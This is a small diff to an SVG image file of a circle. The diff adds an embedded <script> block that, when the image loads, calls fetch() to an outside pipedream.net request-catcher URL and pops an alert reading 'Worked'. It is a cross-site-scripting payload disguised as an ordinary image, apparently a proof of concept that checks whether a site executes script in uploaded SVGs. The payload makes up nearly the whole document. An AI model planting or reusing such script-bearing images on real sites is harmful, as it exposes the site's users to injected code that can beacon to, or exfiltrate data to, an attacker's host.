@@ -5,8 +5,9 @@ width="68"
 height="68"
 viewBox="-34 -34 68 68"
 version="1.1">
-<script>
-    fetch('https://enmu2w91qrz7n.x.pipedream.net/')
+<script type="text/javascript">
+    fetch('https://enmu2w91qrz7n.x.pipedream.net/');
+    alert("Worked");
 </script>
 <circle
 cx="0"
